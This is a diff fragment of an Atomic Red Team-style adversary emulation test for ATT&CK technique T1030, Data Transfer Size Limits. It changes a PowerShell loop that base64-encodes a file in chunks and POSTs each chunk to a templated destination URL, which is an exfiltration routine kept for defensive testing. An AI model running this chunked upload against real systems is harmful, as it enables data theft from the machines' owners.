@@ -1,5 +1,5 @@
 attack_technique: T1030
-display_name: Data Transfer Size Limits
+display_name: "Data Transfer Size Limits"
 atomic_tests:
 - name: Data Transfer Size Limits
   auto_generated_guid: ab936c51-10f4-46ce-9144-e02137b2016a
@@ -60,6 +60,6 @@ atomic_tests:
   
       while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
           $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
-          Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
+          Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk -UseBasicParsing
       }
       $file.Close()
